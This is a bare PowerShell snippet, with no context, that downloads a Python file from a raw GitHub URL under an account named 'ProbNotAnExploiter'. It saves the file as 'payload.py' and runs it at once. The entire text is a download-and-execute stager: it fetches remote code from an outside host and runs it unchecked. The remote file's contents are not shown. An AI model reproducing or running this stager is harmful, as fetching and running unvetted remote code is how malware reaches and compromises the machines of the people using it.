$url = 'https://raw.githubusercontent.com/ProbNotAnExploiter/wordies/edit/main/letters/test.py'
$client = New-Object System.Net.WebClient
$client.DownloadFile($url, 'payload.py')

& 'payload.py'
